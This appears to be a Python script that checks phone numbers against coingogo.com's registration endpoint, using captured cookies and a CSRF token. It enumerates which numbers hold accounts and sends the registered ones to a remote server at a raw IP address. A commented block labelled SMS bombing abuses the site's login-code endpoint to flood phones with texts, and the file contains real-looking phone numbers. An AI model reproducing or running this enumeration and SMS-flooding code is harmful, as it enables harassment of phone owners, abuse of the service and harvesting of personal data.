import requests
# from 短信轰炸.number_mongo import auto_number
# from number_mongo import number_BaFangZiYuan


# 检测手机号是否注册币源
def check_number(number):
    url = "https://www.coingogo.com/common/check-mobile-exists"
    headers = {'Host': 'www.coingogo.com', 'Connection': 'keep-alive', 'Content-Length': '126', 'Pragma': 'no-cache',
               'Cache-Control': 'no-cache', 'Origin': 'https://www.coingogo.com',
               'X-CSRF-Token': 'ZA1vrjifpYsHij2rSeOxparR7KdGv0l9K9atvU-cQpUXOSvsYtXV3Te_Yskd2tLf5YOblhXqIxwTjvePO8kT9w==',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*',
               'X-Requested-With': 'XMLHttpRequest', 'Referer': 'https://www.coingogo.com/site/signup',
               'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': 'yunsuo_session_verify=5d077910b151b559560bc97ed51ac259; advanced-frontend=phv53e7nq33h7facgfnik6bau0; Hm_lvt_1c11af2487f7387eeeb4bc2dfaac6bac=1529653967; Hm_lpvt_1c11af2487f7387eeeb4bc2dfaac6bac=1529653967; __asc=ddb3aad6164267b3a9a62f9e5f3; __auc=ddb3aad6164267b3a9a62f9e5f3'}
    form_data = [('mobile', number),
                 ('_csrf-frontend',
                  "ZA1vrjifpYsHij2rSeOxparR7KdGv0l9K9atvU-cQpUXOSvsYtXV3Te_Yskd2tLf5YOblhXqIxwTjvePO8kT9w=="),
                 ]
    page = requests.post(url, headers=headers, data=form_data).text
    print(page)
    return page.replace("\n", "")


def save_success_number(number):
    with open("success.txt", "a+")as f:
        f.write(str(number) + "\n")


def save_faile_number(number):
    with open("faile.txt", "a+")as f:
        f.write(str(number) + "\n")


def save(number):
    url ="http://122.114.183.102:8080/saveNumber/{0}/".format(number,)
    print(requests.get(url).text)


if __name__ == "__main__":
    check_number("13247785048")
    # count = 312845
    # while True:
    #     try:
    #         with open("flag_币源.txt")as f:
    #             count = int(f.read())
    #         for res in number_BaFangZiYuan.find({'_id': count}):
    #             line = res["number"].replace("\n", "")
    #             print(line, count)
    #             count += 1
    #             result = check_number(line)
    #             if result == "Success":
    #                 save_success_number(number=line)
    #                 save(number=line)
    #             else:
    #                 save_faile_number(number=line)
    #         with open("flag_币源.txt", "w")as f:
    #             f.write(str(count))
    #     except:
    #         pass

# 发短信接口轰炸
# url ="https://www.coingogo.com/common/send-login-code"
# form_data = [
#     ('mobile', 15778019596),
#     ('usage', 'memberRegister'),
#     ('_csrf-frontend', "ZA1vrjifpYsHij2rSeOxparR7KdGv0l9K9atvU-cQpUXOSvsYtXV3Te_Yskd2tLf5YOblhXqIxwTjvePO8kT9w=="),
#     ]
# page = requests.post(url,headers=headers,data=form_data).text
# print(page)
"""
Failed
13979061414 312844
Failed
13979061411 312845
Failed
"""
